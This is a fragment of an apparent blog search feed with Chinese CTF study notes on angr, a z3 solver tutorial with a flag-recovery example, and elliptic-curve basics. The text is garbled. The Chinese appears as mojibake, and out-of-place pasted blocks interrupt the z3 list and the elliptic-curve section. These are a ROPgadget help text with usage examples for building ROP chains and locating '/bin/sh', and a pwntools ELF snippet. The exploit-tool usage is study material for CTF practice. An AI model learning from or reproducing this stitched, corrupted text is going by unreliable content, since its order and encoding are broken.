      <url>/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7%E5%85%B6%E4%BD%99%E5%B7%A5%E5%85%B7-%E5%BE%85%E5%A1%AB%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h3 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h3><p><a href="https://www.cnblogs.com/0xJDchen/p/9291335.html">åŠ¨è‹¥è„±å…”:æ·±å…¥æµ…å‡ºangrâ€”åˆæ­¥ç†è§£ç¬¦å·æ‰§è¡Œä»¥åŠangræ¶æ„ - 0xJDchen - åšå®¢å›­</a></p><h3 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h3>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·z3çº¦æŸæ±‚è§£å™¨</title>
      <link href="/2024/08/23/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7z3%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/23/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7z3%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="z3åº“"><a href="#z3åº“" class="headerlink" title="z3åº“"></a>z3åº“</h1><hr><h2 id="ä¸‹è½½z3åº“"><a href="#ä¸‹è½½z3åº“" class="headerlink" title="ä¸‹è½½z3åº“"></a>ä¸‹è½½z3åº“</h2><p><code>pip3 install z3-solver</code></p><hr><h2 id="åŸºæœ¬å˜é‡ç±»å‹"><a href="#åŸºæœ¬å˜é‡ç±»å‹" class="headerlink" title="åŸºæœ¬å˜é‡ç±»å‹"></a>åŸºæœ¬å˜é‡ç±»å‹</h2><p>æ•´å‹(Int)ï¼Œå®å‹(Real)å’Œå‘é‡(BitVec)</p><h3 id="æ•´å‹"><a href="#æ•´å‹" class="headerlink" title="æ•´å‹"></a>æ•´å‹</h3><ol><li><p>Int(name, ctx=None)ï¼Œåˆ›å»ºä¸€ä¸ªæ•´æ•°å˜é‡ï¼Œnameæ˜¯åå­—</p></li><li><p>Ints (names, ctx=None)ï¼Œåˆ›å»ºå¤šä¸ªæ•´æ•°å˜é‡ï¼Œnamesæ˜¯ç©ºæ ¼åˆ†éš”åå­—</p></li><li><p>xxxxxxxxxx92 1ROPgadget çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š2ç”¨æ³•ï¼šROPgadget [-h] [-v] [-c] [â€”binary <binary>] [â€”opcode <opcodes>]3[â€”string <string>] [â€”memstr <string>] [â€”depth <nbyte>] [â€”only <key>]4[â€”filter <key>] [â€”range <start-end>] [â€”badbytes <byte>]5[â€”rawArch <arch>] [â€”rawMode <mode>] [â€”rawEndian <endian>] [â€”re <re>]6[â€”offset <hexaddr>] [â€”ropchain] [â€”thumb] [â€”console] [â€”norop]7[â€”nojop] [â€”callPreceded] [â€”nosys] [â€”multibr] [â€”all] [â€”noinstr]8[â€”dump] [â€”silent] [â€”align ALIGN] [â€”mipsrop <rtype>]9é€‰é¡¹ç¿»è¯‘ï¼š10 11    -h, â€”helpï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡ºã€‚12    -v, â€”versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡ºã€‚13    -c, â€”colorï¼šè¾“å‡ºå½©è‰²ç»“æœï¼ˆéœ€è¦ç»ˆç«¯æ”¯æŒï¼‰ã€‚14    â€”binary <binary>ï¼šæŒ‡å®šè¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚15    â€”opcode <opcodes>ï¼šæœç´¢åŒ…å«æŒ‡å®šæŒ‡ä»¤çš„ gadgetsã€‚16    â€”string <string>ï¼šæœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚17    â€”memstr <string>ï¼šæœç´¢åœ¨å†…å­˜ä¸­æ‰¾åˆ°æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚18    â€”depth <nbyte>ï¼šæœç´¢æŒ‡å®šæ·±åº¦çš„ gadgetsã€‚19    â€”only <key>ï¼šä»…æ˜¾ç¤ºåŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚20    â€”filter <key>ï¼šæ’é™¤åŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚21    â€”range <start-end>ï¼šåœ¨æŒ‡å®šåœ°å€èŒƒå›´å†…æœç´¢ gadgetsã€‚22    â€”badbytes <byte>ï¼šæ’é™¤åŒ…å«æŒ‡å®šå­—èŠ‚çš„ gadgetsã€‚23    â€”rawArch <arch>ï¼šæŒ‡å®šåŸå§‹æ¶æ„ï¼ˆä¾‹å¦‚ x86, amd64, arm ç­‰ï¼‰ã€‚24    â€”rawMode <mode>ï¼šæŒ‡å®šåŸå§‹æ¨¡å¼ï¼ˆä¾‹å¦‚ 32 æˆ– 64 ä½ï¼‰ã€‚25    â€”rawEndian <endian>ï¼šæŒ‡å®šåŸå§‹å­—èŠ‚åºï¼ˆä¾‹å¦‚ little æˆ– bigï¼‰ã€‚26    â€”re <re>ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ gadgetsã€‚27    â€”offset <hexaddr>ï¼šæ˜¾ç¤ºç»™å®šåç§»åœ°å€é™„è¿‘çš„ gadgetsã€‚28    â€”ropchainï¼šä¸ºæ‰¾åˆ°çš„ gadgets ç”Ÿæˆä¸€ä¸ª ROP é“¾ã€‚29    â€”thumbï¼šé’ˆå¯¹ ARM Thumb æŒ‡ä»¤é›†æœç´¢ gadgetsã€‚30    â€”consoleï¼šå°†è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼ˆåœ¨ â€”ropchain æ¨¡å¼ä¸‹æœ‰ç”¨ï¼‰ã€‚31    â€”noropï¼šä¸æ˜¾ç¤º ROP gadgetsã€‚32    â€”nojopï¼šä¸æ˜¾ç¤º JOP gadgetsã€‚33    â€”callPrecededï¼šä»…æ˜¾ç¤ºè¢«è°ƒç”¨æŒ‡ä»¤å‰é¢çš„ gadgetsã€‚34    â€”nosysï¼šä¸æ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨ gadgetsã€‚35    â€”multibrï¼šæ˜¾ç¤ºå¤šä¸ªåˆ†æ”¯çš„ gadgetsã€‚36    â€”allï¼šæ˜¾ç¤ºæ‰€æœ‰ gadgetsï¼Œæ— è¿‡æ»¤ã€‚37    â€”noinstrï¼šä¸æ˜¾ç¤ºæŒ‡ä»¤ï¼Œåªæ˜¾ç¤ºåç§»ã€‚38    â€”dumpï¼šè¾“å‡º gadgets çš„åŸå§‹å­—èŠ‚ã€‚39    â€”silentï¼šä¸æ˜¾ç¤ºä»»ä½•è­¦å‘Šæˆ–ä¿¡æ¯ã€‚40    â€”align ALIGNï¼šå¯¹ gadgets åç§»è¿›è¡Œå¯¹é½ã€‚41    â€”mipsrop <rtype>ï¼šé’ˆå¯¹ MIPS æ¶æ„ï¼ŒæŒ‡å®š ROP ç±»å‹ï¼ˆä¾‹å¦‚ rop, jop, rop_nopï¼‰ã€‚42 43è¿™äº›é€‰é¡¹å¯ä»¥å¸®åŠ©ä½ æ ¹æ®ç‰¹å®šéœ€æ±‚å®šåˆ¶ ROPgadget çš„æœç´¢å’Œåˆ†æè¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ â€”opcode æ¥æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—çš„ gadgetsï¼Œæˆ–è€…ä½¿ç”¨ â€”range æ¥é™åˆ¶æœç´¢çš„åœ°å€èŒƒå›´ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨ â€”ropchain æ¥è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŸºäºæ‰¾åˆ°çš„ gadgets çš„ ROP é“¾ï¼Œè¿™å¯¹äºå¿«é€Ÿæ„å»ºæ”»å‡»è½½è·éå¸¸æœ‰ç”¨ã€‚44 45è¿™äº›ä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ROPgadgetçš„ä¸åŒé€‰é¡¹æ¥æ‰§è¡Œç‰¹å®šçš„æœç´¢å’Œåˆ†æä»»åŠ¡ã€‚ä¸‹é¢æ˜¯æ¯ä¸ªä¾‹å­åŠå…¶ç”¨é€”çš„ä¸­æ–‡è§£é‡Šï¼š46ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x8647è¿™ä¸ªå‘½ä»¤å¯¹æŒ‡å®šçš„x86 Linux ELFäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡ŒROP gadgetsæœç´¢ã€‚48â€”â€”â€”â€”â€”â€”â€”-49ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”ropchain50è¿™ä¸ªå‘½ä»¤é™¤äº†æœç´¢ROP gadgetsä¹‹å¤–ï¼Œè¿˜è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªROPé“¾ã€‚51 â€”â€”â€”â€”â€”â€”â€”52ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”depth 353è¿™ä¸ªå‘½ä»¤æœç´¢æ·±åº¦ä¸º3çš„ROP gadgetsï¼Œå³åªæœç´¢åŒ…å«3ä¸ªæˆ–æ›´å°‘æŒ‡ä»¤çš„gadgetsã€‚54â€”â€”â€”â€”â€”â€”â€”-55ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”string â€œmainâ€56è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«å­—ç¬¦ä¸²â€mainâ€çš„ROP gadgetsã€‚57â€”â€”â€”â€”â€”â€”â€”-58ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”string â€œm..nâ€59è¿™ä¸ªå‘½ä»¤ä½¿ç”¨é€šé…ç¬¦æœç´¢åŒ…å«ä»¥â€mâ€å¼€å¤´ï¼Œæ¥ç€æ˜¯ä»»æ„å­—ç¬¦ï¼Œä»¥â€nâ€ç»“å°¾çš„å­—ç¬¦ä¸²çš„gadgetsã€‚60â€”â€”â€”â€”â€”â€”â€”-61ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”opcode c9c362è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—0xc9ï¼ˆleaveï¼‰å’Œ0xc3ï¼ˆretï¼‰çš„ROP gadgetsã€‚63â€”â€”â€”â€”â€”â€”â€”-64ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”only â€œmov|retâ€65è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movæˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚66â€”â€”â€”â€”â€”â€”â€”67ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”only â€œmov|pop|xor|retâ€68è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movã€popã€xoræˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚69â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”70ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”filter â€œxchg|add|sub|cmov.*â€71è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«xchgã€addã€subæˆ–ä»¥cmovå¼€å¤´çš„æŒ‡ä»¤çš„gadgetsã€‚72â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”73ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”norop â€”nosys74è¿™ä¸ªå‘½ä»¤æœç´¢gadgetsï¼Œä½†ä¸æ˜¾ç¤ºROP gadgetså’Œç³»ç»Ÿè°ƒç”¨gadgetsã€‚75â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”76ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”range 0x08041000-0x0804200077è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢ROP gadgetsã€‚78â€”â€”â€”â€”â€”â€”â€”â€”â€”79ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”string main â€”range 0x080c9aaa-0x080c9aba80è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢åŒ…å«å­—ç¬¦ä¸²â€mainâ€çš„ROP gadgetsã€‚81â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”82ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”memstr â€œ/bin/shâ€83è¿™ä¸ªå‘½ä»¤æœç´¢åœ¨å†…å­˜ä¸­èƒ½æ‰¾åˆ°å­—ç¬¦ä¸²â€/bin/shâ€çš„ROP gadgetsã€‚84â€”â€”â€”â€”â€”â€”â€”â€”â€”85ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”console86è¿™ä¸ªå‘½ä»¤å°†ROP gadgetsçš„è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚ç”ŸæˆROPé“¾æ—¶ï¼Œå¯èƒ½å¾ˆæœ‰ç”¨ã€‚87â€”â€”â€”â€”â€”â€”â€”â€”â€”88ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”badbytes â€œ00|01-1f|7f|42â€89è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«ç‰¹å®šå­—èŠ‚åºåˆ—çš„gadgetsï¼Œå¦‚ç©ºå­—èŠ‚ã€æ§åˆ¶å­—ç¬¦å’Œå­—èŠ‚0x42ã€‚90â€”â€”â€”â€”â€”â€”â€”â€”â€”91ROPgadget.py â€”binary ./test-suite-binaries/Linux_lib64.so â€”offset 0xdeadbeef0000000092è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åº“æ–‡ä»¶ä¸­æœç´¢åç§»`0xdeadbeef00000000Powershell</rtype></hexaddr></re></endian></mode></arch></byte></start-end></key></key></nbyte></string></string></opcodes></binary></rtype></hexaddr></re></endian></mode></arch></byte></start-end></key></key></nbyte></string></string></opcodes></binary></p></li></ol><h3 id="å®æ•°"><a href="#å®æ•°" class="headerlink" title="å®æ•°"></a>å®æ•°</h3><ol><li><p>real(name, ctx=None)ï¼Œåˆ›å»ºä¸€ä¸ªå®å˜é‡ï¼Œnameæ˜¯åå­—</p></li><li><p>reals (names, ctx=None)ï¼Œåˆ›å»ºå¤šä¸ªå®å˜é‡ï¼Œnamesæ˜¯ç©ºæ ¼åˆ†éš”åå­—</p></li><li><p>realVal (val, ctx=None)ï¼Œåˆ›å»ºä¸€ä¸ªå®å¸¸é‡ï¼Œæœ‰åˆå§‹å€¼ï¼Œæ²¡åå­—ã€‚</p></li></ol><h3 id="å‘é‡"><a href="#å‘é‡" class="headerlink" title="å‘é‡"></a>å‘é‡</h3><p>BitVec(å˜é‡å,å˜é‡çš„å¤§å°ï¼ˆå•ä½bitï¼‰)</p><ol><li><p><code>BitVec(name,bv,ctx=None)</code>ï¼Œåˆ›å»ºä¸€ä¸ªä½å‘é‡ï¼Œnameæ˜¯ä»–çš„åå­—ï¼Œbvè¡¨ç¤ºå¤§å°  </p></li><li><p><code>BitVecs(name,bv,ctx=None)</code>ï¼Œåˆ›å»ºä¸€ä¸ªæœ‰å¤šå˜é‡çš„ä½å‘é‡ï¼Œnameæ˜¯åå­—ï¼Œbvè¡¨ç¤ºå¤§å°  </p></li><li><p><code>BitVecVal(val,bv,ctx=None)</code>ï¼Œåˆ›å»ºä¸€ä¸ªä½å‘é‡ï¼Œæœ‰åˆå§‹å€¼ï¼Œæ²¡åå­—ã€‚</p></li></ol><hr><h2 id="å¸¸ç”¨API"><a href="#å¸¸ç”¨API" class="headerlink" title="å¸¸ç”¨API"></a>å¸¸ç”¨API</h2><ol><li>åˆ›å»ºçº¦æŸæ±‚è§£å™¨  <code>s = Solver()</code></li><li>xxxxxxxxxx10 1&gt;&gt;&gt; e = ELF(â€˜/bin/catâ€™)2&gt;&gt;&gt; print hex(e.address)  # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€30x4000004&gt;&gt;&gt; print hex(e.symbols[â€˜writeâ€™]) # å‡½æ•°åœ°å€,symbols,got,pltå‡æ˜¯åˆ—è¡¨50x4016806&gt;&gt;&gt; print hex(e.got[â€˜writeâ€™]) # GOTè¡¨çš„åœ°å€70x60b0708&gt;&gt;&gt; print hex(e.plt[â€˜writeâ€™]) # PLTçš„åœ°å€90x40168010&gt;&gt;&gt; print hex(e.search(â€˜/bin/shâ€™).next())# å­—ç¬¦ä¸²/bin/shçš„åœ°å€å­—ç¬¦ä¸²åŠ ï¼ˆï¼‰python</li><li>åˆ¤æ–­è§£æ˜¯å¦å­˜åœ¨ ï¼ˆå­˜åœ¨å°±æ‰“å°è¿”å›satï¼‰<code>s.check()</code></li><li>æ±‚è§£  <code>print(s.model()[å‘é‡å])</code></li></ol><p>ç”¨èµ·æ¥è¿˜æ˜¯æŒºç®€å•çš„ï¼Œåªä¸è¿‡è¿™é‡Œå¿…é¡»è¦åŠ check()æ£€æµ‹ä¸ç„¶ä¼šæŠ¥é”™ï¼Œå¦‚å›¾ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"># å¯¼å…¥Z3çº¦æŸæ±‚è§£åº“from z3 import *# å®šä¹‰ä¸€ä¸ªåä¸º&#39;x&#39;çš„æ•´æ•°ç¬¦å·å˜é‡x &#x3D; Int(&#39;x&#39;)# å®šä¹‰ä¸€ä¸ªåä¸º&#39;y&#39;çš„æ•´æ•°ç¬¦å·å˜é‡y &#x3D; Int(&#39;y&#39;)# åˆ›å»ºä¸€ä¸ªæ–°çš„æ±‚è§£å™¨å¯¹è±¡ï¼Œç”¨äºè§£å†³ä¸€ç»„çº¦æŸs &#x3D; Solver()# å‘æ±‚è§£å™¨æ·»åŠ ä¸‰ä¸ªçº¦æŸæ¡ä»¶ï¼š# 1. x å¤§äº 2# 2. y å°äº 10# 3. x å’Œ 2å€çš„y çš„å’Œç­‰äº 7s.add(x &gt; 2, y &lt; 10, x + 2*y &#x3D;&#x3D; 7)# æ£€æŸ¥æ±‚è§£å™¨ä¸­çš„çº¦æŸæ˜¯å¦æœ‰è§£s.check()# å¦‚æœæ±‚è§£å™¨ä¸­çš„çº¦æŸæœ‰è§£ï¼Œåˆ™æ‰“å°å‡ºæ»¡è¶³è¿™äº›çº¦æŸçš„æ¨¡å‹ï¼ˆå³å˜é‡çš„èµ‹å€¼ï¼‰print(s.model())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">import z3s &#x3D; z3.Solver()flag &#x3D; [z3.BitVec(f&#39;flag_&#123;i&#125;&#39;, 8) for i in range(40)]cipher &#x3D; [     98, 113, 163, 181, 115, 148, 166,  43,   9,  95,    165, 146,  79, 115, 146, 233, 112, 180,  48,  79,     65, 181, 113, 146,  46, 249,  78, 183,  79, 133,    180, 113, 146, 148, 163,  79,  78,  48, 231,  77]for i in range(40):    s.add(32 &lt;&#x3D; flag[i], flag[i] &lt;&#x3D; 126)    s.add(flag[i] * 17 &#x3D;&#x3D; cipher[i])if s.check() &#x3D;&#x3D; z3.sat:    m &#x3D; s.model()    print(&#39;&#39;.join(chr(m[f].as_long()) for f in flag))# BaseCTF&#123;yoUr_CrYpt0_1earNinG_5tarTs_n0w&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æ¤­åœ†æ›²çº¿</title>
      <link href="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/"/>
      <url>/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äº”ï¼ˆæ¤­åœ†æ›²çº¿ï¼‰</h2><hr><h1 id="æ¤­åœ†æ›²çº¿"><a href="#æ¤­åœ†æ›²çº¿" class="headerlink" title="æ¤­åœ†æ›²çº¿"></a>æ¤­åœ†æ›²çº¿</h1><hr><h2 id="æ¤­åœ†æ›²çº¿-elliptic-curve"><a href="#æ¤­åœ†æ›²çº¿-elliptic-curve" class="headerlink" title="æ¤­åœ†æ›²çº¿(elliptic curve)"></a>æ¤­åœ†æ›²çº¿(elliptic curve)</h2><p><strong>å®šä¹‰</strong>ï¼š<strong>æ¤­åœ†æ›²çº¿</strong>æ˜¯ä¸€æ¡ç”±æ–¹ç¨‹$y^2=x^3+ax+b$ç»™å®šçš„æ›²çº¿ï¼Œå…¶ä¸­ $a,b\in F,char(F)\neq 2,3$ï¼Œï¼Œå¹¶æ»¡è¶³ $\Delta=4a^3+27b^2\neq0$ ã€‚<br>ä¸¢ç•ªå›¾æ›²çº¿ï¼š$y^2=x^3-x+9$ ($a=-1,b=9)$, ($x,y)\in\mathbb{Q}^2$</p><p>$\Delta\neq0$:éå¥‡å¼‚(non-singular),<strong>å…‰æ»‘</strong>ï¼Œ$x^3+ax+b$æ— é‡æ ¹<br>$\Delta=0$:å¥‡å¼‚ (singular),ä¸å…‰æ»‘ï¼Œ$x^3+ax+b$<strong>æœ‰é‡æ ¹(å¥‡å¼‚ç‚¹)</strong></p><blockquote><p>è¡¥å……ï¼šæœ‰é‡æ ¹è¯´æ˜å¤šé¡¹å¼å’Œå®ƒçš„å¯¼æ•°å­˜åœ¨å…¬å…±æ ¹</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822164917677.png" alt="å¥‡å¼‚ç‚¹"></p><p>å‰ä¸¤ä¸ªå«<strong>ç»“ç‚¹(node)</strong>ï¼Œç¬¬ä¸‰ä¸ªå«<strong>å°–ç‚¹(cusp)</strong></p><p><strong>å¥‡å¼‚ç‚¹</strong>ï¼š</p><ul><li>è¯¥ç‚¹å¤„æ›²çº¿ä¸å¯å¾®åˆ†ï¼Œå³å¥‡å¼‚ç‚¹å¤„æ— æ³•ä½œåˆ‡çº¿(åˆ‡çº¿å€¼æ— å®šä¹‰)</li><li>åªè¦æ¤­åœ†æ›²çº¿æ˜¯å¥‡å¼‚çš„ï¼Œå¥‡å¼‚ç‚¹å°±ä¸€å®šåœ¨xè½´ä¸Š</li><li>å½“ç‚¹çš„é›†åˆåŒ…å«å¥‡å¼‚ç‚¹æ—¶æ— æ³•æ„æˆç¾¤ï¼Œå› ä¸ºå¥‡å¼‚ç‚¹å¤„æ— æ³•ä½œåˆ‡çº¿ï¼Œæ•…è®¨è®ºæ¤­åœ†æ›²çº¿æ—¶æ’é™¤å¥‡å¼‚çš„æƒ…å†µ</li><li>å¥‡å¼‚ç‚¹åˆ°åŸç‚¹çš„è·ç¦»æ˜¯å·¦æ ¹åˆ°åŸç‚¹çš„è·ç¦»çš„ä¸€åŠ</li></ul><p><strong>åˆ¤åˆ«å¼</strong>:</p><p>$\Delta&lt;0$æ—¶ï¼š</p><ul><li>å›¾åƒæœ‰ä¸€ä¸ªç»„æˆéƒ¨åˆ†</li><li>$x^3+ax+b=0$åªæœ‰å”¯ä¸€çš„å®æ•°æ ¹</li></ul><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822165700141-1724317031959-1.png" alt="åˆ¤åˆ«å¼å°äº0"></p><p>$\Delta&gt;0$æ—¶ï¼š</p><ul><li>å›¾åƒæœ‰ä¸¤ä¸ªç»„æˆéƒ¨åˆ†</li><li>$x^3+ax+b=0$æœ‰ä¸‰ä¸ªä¸åŒçš„å®æ•°æ ¹</li></ul><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822165825940.png" alt="åˆ¤åˆ«å¼å¤§äº0"></p><p>xxxxxxxxxx10 1&gt;&gt;&gt; e = ELF(â€˜/bin/catâ€™)2&gt;&gt;&gt; print hex(e.address)  # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€30x4000004&gt;&gt;&gt; print hex(e.symbols[â€˜writeâ€™]) # å‡½æ•°åœ°å€,symbols,got,pltå‡æ˜¯åˆ—è¡¨50x4016806&gt;&gt;&gt; print hex(e.got[â€˜writeâ€™]) # GOTè¡¨çš„åœ°å€70x60b0708&gt;&gt;&gt; print hex(e.plt[â€˜writeâ€™]) # PLTçš„åœ°å€90x40168010&gt;&gt;&gt; print hex(e.search(â€˜/bin/shâ€™).next())# å­—ç¬¦ä¸²/bin/shçš„åœ°å€å­—ç¬¦ä¸²åŠ ï¼ˆï¼‰python</p><ul><li><strong>æ¤­åœ†æ›²çº¿</strong>ï¼šé­å°”æ–¯ç‰¹æ‹‰æ–¯æ–¹ç¨‹ $y^2=x^3+ax+b$å®šä¹‰åœ¨åŸŸä¸Šçš„ä¸€æ¡å…‰æ»‘å°„å½±<strong>äºæ ¼(genus)ä¸º1</strong>çš„æ›²çº¿ã€‚</li><li><strong>æ¤­åœ†</strong>ï¼š<strong>äºæ ¼ä¸º0</strong>çš„æ›²çº¿ã€‚</li></ul></blockquote><h3 id="æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹"><a href="#æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹" class="headerlink" title="æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹"></a>æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹</h3><script type="math/tex; mode=display">E=\{(x,y)|y^2=x^3+ax+b\}\cup\{O\}</script><p>æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹é€šå¸¸ç”¨Pã€Qæˆ–Rè¡¨ç¤º<br>O:<strong>æ— ç©·è¿œç‚¹(point at infinity)</strong></p><hr><h2 id="åŠ æ³•"><a href="#åŠ æ³•" class="headerlink" title="åŠ æ³•"></a>åŠ æ³•</h2><h3 id="å‡ ä½•è¡¨ç¤º"><a href="#å‡ ä½•è¡¨ç¤º" class="headerlink" title="å‡ ä½•è¡¨ç¤º"></a>å‡ ä½•è¡¨ç¤º</h3><p>ç¾¤ï¼š$(E,+)$<br>åŠ æ³•è¿ç®—+: $E$é‡Œç‚¹å’Œç‚¹ä¹‹é—´çš„åŠ æ³•(å¹¶éç®€å•çš„åæ ‡é—´åŠ æ³•ï¼Œè€Œæ˜¯ä¸€ç§å‡ ä½•çš„æ–¹æ³•)</p><p>$(E,+)$<strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong>å¯¹äº$\forall P,Q,R\in E$,éƒ½æœ‰</p><ul><li>å°é—­æ€§ï¼š$P+Q\in E$</li><li>ç»“åˆå¾‹ï¼š$(P+Q)+R=P+(Q+R)$</li><li>å•ä½å…ƒï¼š$P+O=O+P=P$ (<strong>æ— ç©·è¿œç‚¹$O$æ˜¯å•ä½å…ƒ</strong>)</li><li>é€†å…ƒï¼š$P+(-P)=O$    ($P=(x_1,y_1),-P=(x_1,-y_1)$)</li><li>äº¤æ¢å¾‹ï¼š$P+Q=Q+P$</li></ul><p><strong>æ¤­åœ†æ›²çº¿ä¸‰ä¸ªç‚¹åœ¨ä¸€æ¡ç›´çº¿ä¸Šæ—¶ï¼Œä¸‰ä¸ªç›¸åŠ ç­‰äºæ— ç©·è¿œç‚¹</strong></p><p><strong>4ç§æƒ…å†µ</strong>:</p><ul><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160653715.png" alt="æƒ…å†µ1"></li><li><img 